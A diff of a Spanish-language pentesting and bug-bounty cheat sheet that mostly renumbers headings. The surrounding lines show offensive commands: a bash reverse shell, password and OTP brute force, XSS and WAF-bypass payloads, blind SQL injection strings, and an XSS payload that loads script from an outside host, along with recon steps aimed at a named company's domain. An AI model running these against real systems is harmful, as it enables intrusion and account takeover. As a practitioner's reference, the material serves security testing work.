@@ -3,7 +3,7 @@
 `Pentesting Notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.
 
 
-## Nmap
+## 1.1.Nmap
 
 1. Usar **-T2** para entornos reales
 
@@ -29,7 +29,7 @@
    nmap -sV -vv --script vuln <TARGET_IP>
    ```
 
-## Gobuster
+## 1.2.Gobuster
 
 1. Para realizar ataques de **fuerza bruta** contra URI (directorios y archivos), subdominios DNS y nombres de host virtuales
 
@@ -40,7 +40,7 @@
    gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
    ```
 
-## wfuzz
+## 1.3.wfuzz
 
 1. Para realizar ataques de **fuerza bruta** en APIs
 
@@ -48,7 +48,7 @@
    wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
    ```
 
-## Hydra
+## 1.4.Hydra
 
 1. Para realizar ataques de **fuerza bruta** de contraseñas FTP, SSH
 
@@ -68,7 +68,7 @@
    hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "login/:username=^USER^&password=^PASS^:F=incorrect" -V
    ```
 
-## Enum4linux: SMB
+## 1.5.Enum4linux: SMB
 
 1. Enum4linux es una herramienta que se utiliza para enumerar recursos compartidos SMB tanto en sistemas Windows como Linux. Opciones **-U** (get userlist), **-M** (get machine list), **-N** (get namelist dump (different from -U and-M)), **-S**  (get sharelist), **-P**  (get password policy information), **-G** (get group and member list) and **-a** (all of the above (full basic enumeration)).
 
@@ -100,7 +100,7 @@
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP> 
    ``` 
 
-## Rockyou
+## 1.6.Rockyou
 
 1. Descomprimir
 
@@ -108,7 +108,7 @@
    gzip -d /usr/share/wordlists/rockyou.txt.gz
    ```
 
-## SSH
+## 1.7.SSH
 
 1. Realizar un conexión remota
 
@@ -146,7 +146,7 @@
    sudo ssh -i id_rsa <username>@<TARGET_IP>
    ```
 
-## NSF
+## 1.8.NSF
 
 1. Montar NFS compartidos
 
@@ -154,7 +154,7 @@
    sudo mount -t nfs IP:share /tmp/mount/ -nolock
    ```
 
-## FTP
+## 1.9.FTP
 
 1. Vulnerabilidad en modulo mod_Copy
 
@@ -179,7 +179,7 @@
    ```
 
 
-## Linux: Privilege escalation
+## 1.10.Linux: Privilege escalation
 
 1. Buscar permisos en todos los archivos SUID:
    - Los bits SUID pueden ser peligrosos, algunos binarios como passwd    necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.
@@ -196,7 +196,7 @@
    ```
 
 
-## Data Base: SQL, MYSQL, SQLITE
+## 1.11.Data Base: SQL, MYSQL, SQLITE
 
 1. Leear archivos sqlite
    
@@ -208,7 +208,7 @@
    ```
    
 
-## Linux: Comandos mas usados
+## 1.12.Linux: Comandos mas usados
 
 1. Para trasnferir archivos usando nc
 
@@ -253,7 +253,7 @@
    /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
    ``` 
 
-## Sitios Web
+## 1.13.Sitios Web
 
 1. Para descifrar hashes de contraseñas débiles
 
@@ -286,7 +286,7 @@
    ```
 
 
-## Extensiones para web browser
+## 1.14.Extensiones para web browser
 
 1. Ripper Web Content | Capture Metadata Content
 
@@ -311,7 +311,7 @@
 
 `Bug bounty notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar Bug bounty desde lo mas básico a lo avanzado.
 
-## Katana
+## 2.1.Katana
 
 1. Para encontrar documentos confidenciales, sensibles y a datos de PII.
 
@@ -328,7 +328,7 @@
    echo ejemplo.com | katana -passive -f qurl -pss waybackarchive,commoncrawl,alienvault | httpx -mc 200 | grep -E '\.(js|php)$' | tee specificEndpoints
    ```
 
-## Nuclei
+## 2.2.Nuclei
 
 1. Para detectar sitios web de phishing.
 
@@ -336,7 +336,7 @@
    nuclei -l websites_Possible_Phishing -tags phishing -itags phishing
    ```
    
-## XSS Reflejado
+## 2.3.XSS Reflejado
 
 1. XXS reflejado con zero click en un '<'input'>' vulnerable
 
@@ -344,7 +344,7 @@
    hola" " onfocus="alert(document.domain)" autofocus="
    ```
 
-## XSS Almacenado
+## 2.4.XSS Almacenado
 
 1. Crea un fichero en linux y luego sube ese archivo a través de un cargador, tendrás un XSS almacenado si el nombre del archivo está almacenado y el desarrollador se ha olvidado de desinfectar este campo.
 
@@ -352,7 +352,7 @@
    touch '"><img src=x onerror=alert("xss!")>.pdf'
    ```
    
-## SQL Injection
+## 2.5.SQL Injection
 
 1. SQL Injection.
    
@@ -370,7 +370,7 @@
    '%2BIF(MID(version(),1,6)='10.3.2',sleep(5),v))%2B'
    ```
   
-## SQL Injection Blind
+## 2.6.SQL Injection Blind
 
 1. Blind SQL Injection MySQL.
    Ejemplo: En la cabecera GET
@@ -389,7 +389,7 @@
    (SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
    ```
    
-## PureDNS
+## 2.7.PureDNS
 
 1. Resolver/forzar mediante DNS
 
@@ -397,7 +397,7 @@
    puredns bruteforce best-dns-wordlist.txt dominio.com -r resolvers.txt -w dns | httpx -mc 200 -o subdomain_output.txt 
    ```
 
-## Azure Active Directory
+## 2.8.Azure Active Directory
 
 1. Enumeración dominios y subdominios con AADInternals en PowerShell (aplica solo si la empresa utiliza Azure AD, de lo contario esta técnica es inútil).
 
@@ -405,7 +405,7 @@
    PS C:\WINDOWS\system32> Get-AADIntTenantDomains -Domain cisco.onmicrosoft.com
    ```
 
-## AWS
+## 2.9.AWS
 
 1. Detectar configuraciones incorrectas y vulnerabilidades en nube (especificamente en AWS, detecta buckets de S3 e instancias EC2 mal configurados).
 
@@ -419,7 +419,7 @@
    echo EJEMPLO.COM | cariddi | grep js | tee js_files | httpx -mc 200 | nuclei -tags aws,amazon
    ```
    
-## Bypass WAF
+## 2.10.Bypass WAF
 
 1. **XSS payloads**.
 
@@ -445,7 +445,7 @@
    <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
    ```
    
-## Shodan
+## 2.11.Shodan
 
 1. Obtener todas las IPs de Shodan sin ninguna cuenta premium
 
@@ -455,7 +455,7 @@
    var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
    ```
    
-## APIs
+## 2.12.APIs
 
 1. Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API en Móviles.
 
@@ -475,7 +475,7 @@
    wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
    ```
    
-## Google Dorks
+## 2.13.Google Dorks
 
 1. Para encontrar datos de PII o información reservada para los procesos de negocio.
 
@@ -487,61 +487,61 @@
 
 # ***III. Metodologia Bug Hunting***
 
-### 1. Encontrar subdominios con subfinder
+### 3.1. Encontrar subdominios con subfinder
 
 ```bash
 subfinder -d viator.com -all  -recursive > subdomain.txt
 ```
 
-### 2. Usando httpx-toolkit
+### 3.2. Usando httpx-toolkit
 
 ```bash
 cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
 ```
 
-### 3. Usando katana
+### 3.3. Usando katana
 
 ```bash
 katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
 ```
 
-### 4. Filtrar por extensiones
+### 3.4. Filtrar por extensiones
 
 ```bash
 cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
 ```
 
-### 5. Filtrar extensiones javascript
+### 3.5. Filtrar extensiones javascript
 
 ```bash
 cat allurls.txt | grep -E "\.js$" >> js.txt
 ```
 
-### 6. Usando nuclei para ver encontrar Information disclosure
+### 3.6. Usando nuclei para ver encontrar Information disclosure
 
 ```bash
 cat js.txt | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ 
 ```
 
-### 7. Usando nuclei para ver encontrar Information disclosure en un sitio web
+### 3.7. Usando nuclei para ver encontrar Information disclosure en un sitio web
 
 ```bash
 echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ -c 30
 ```
 
-### 8. Buscar con dirsearch directorios ocultos vulnerables
+### 3.8. Buscar con dirsearch directorios ocultos vulnerables
 
 ```bash
 dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
 ```
 
-### 9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss
+### 3.9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss
 
 ```bash
 subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
 ```
 
-### 10. Ver certificados SSL vulnerable
+### 3.10. Ver certificados SSL vulnerable
 
 ```bash
 subzy run --targets subdomains_alive.txt --verify_ssl
@@ -550,31 +550,31 @@ subzy run --targets subdomains_alive.txt --verify_ssl
 subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
 ```
 
-### 11. CORS
+### 3.11. CORS
 
 ```bash
 python3 corsy.py -i /home/sn0w/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
 
 ```
-### 12. CORS con Nuclei
+### 3.12. CORS con Nuclei
 
 ```bash
 nuclei -list subdomains_alive.txt -t /home/sn0w/Priv8-Nuclei/cors
 ```
 
-### 13. Nuclei
+### 3.13. Nuclei
 
 ```bash
 nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
 ```
 
-### 14. LFI
+### 3.14. LFI
 
 ```bash
 cat allurls.txt | gf lfi | nuclei -tags lfi
 ```
 
-### 15. OR Open Redirect
+### 3.15. OR Open Redirect
 
 ```bash
 cat allurls.txt | gf redirect | openredirex -p /home/sn0w/openRedirect
